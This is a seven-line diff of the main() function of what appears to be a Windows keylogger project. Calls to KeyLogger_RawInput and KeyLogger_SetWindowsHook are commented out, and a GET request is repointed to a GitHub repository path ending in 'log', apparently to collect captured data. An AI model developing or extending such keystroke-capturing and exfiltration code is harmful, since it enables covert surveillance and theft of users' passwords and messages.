@@ -17,7 +17,7 @@ int main(int argc, char* argv[]) {
 	//KeyLogger_RawInput();	
 	//KeyLogger_SetWindowsHook();
 
-	GET("www.api.github.com/repos");
+	GET("api.github.com/repos/dungngo4520/log");
 	printf("done\n");
 	getchar();
 }
